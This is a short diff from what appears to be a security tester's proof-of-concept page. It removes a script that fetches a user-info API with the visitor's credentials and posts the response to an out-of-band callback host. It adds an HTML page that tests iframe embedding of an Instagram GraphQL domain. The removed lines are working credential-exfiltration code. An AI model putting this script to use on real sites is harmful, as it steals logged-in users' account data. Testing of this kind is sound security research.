@@ -1,12 +1,13 @@
-<script>
-fetch("https://scout.kagi.com/api/userinfo", {
-  credentials: "include"
-})
-.then(res => res.text())
-.then(data => {
-  fetch("https://d1xnmf1z1wg0000mpbb0go6448ayyyyyb.oast.pro", {
-    method: "POST",
-    body: data
-  });
-});
-</script>
+<!DOCTYPE html>
+<html>
+  <head><title>Instagram GraphQL Embed</title></head>
+  <body>
+    <h2>Testing iframe Embedding of graphql.instagram.com</h2>
+    <iframe
+      src="https://graphql.instagram.com"
+      width="100%"
+      height="500px"
+      style="border: 1px solid #ccc"
+    ></iframe>
+  </body>
+</html>
